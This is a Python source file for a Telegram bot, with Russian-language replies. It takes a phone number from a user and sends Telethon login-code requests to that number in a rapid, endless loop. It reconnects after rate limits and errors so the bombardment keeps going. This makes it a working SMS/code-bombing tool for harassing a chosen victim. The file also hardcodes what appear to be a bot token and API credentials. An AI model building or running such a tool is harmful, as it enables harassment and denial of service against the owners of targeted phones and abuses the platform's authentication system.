import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

accounts = [
    {'api_id': 33180472, 'api_hash': '025b7581493ae0d83c3946f27a149057'}
]

spam_tasks = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер (например, +380963836766)")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Остановлено")
    else:
        await update.message.reply_text("Нет активного спама")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт, останови /stop")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Формат: +380...")
        return
    await update.message.reply_text(f"Запущено на {phone}")

    async def spam():
        count = 0
        client = None
        while True:
            try:
                if client is None:
                    acc = accounts[0]
                    client = TelegramClient(None, acc['api_id'], acc['api_hash'])
                    await client.connect()
                await client.send_code_request(phone)
                count += 1
                await context.bot.send_message(chat_id, f"Запрос #{count} отправлен")
                await asyncio.sleep(0.02)
            except FloodWaitError as e:
                sec = e.seconds
                await context.bot.send_message(chat_id, f"Ожидание {sec} сек")
                await client.disconnect()
                client = None
                await asyncio.sleep(sec)
            except Exception as e:
                err = str(e)
                if "all available options" in err or "ResendCodeRequest" in err:
                    await context.bot.send_message(chat_id, "Методы исчерпаны, переподключение")
                    await client.disconnect()
                    client = None
                else:
                    await context.bot.send_message(chat_id, f"Ошибка: {err[:40]}")
                    await client.disconnect()
                    client = None
                await asyncio.sleep(0.05)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
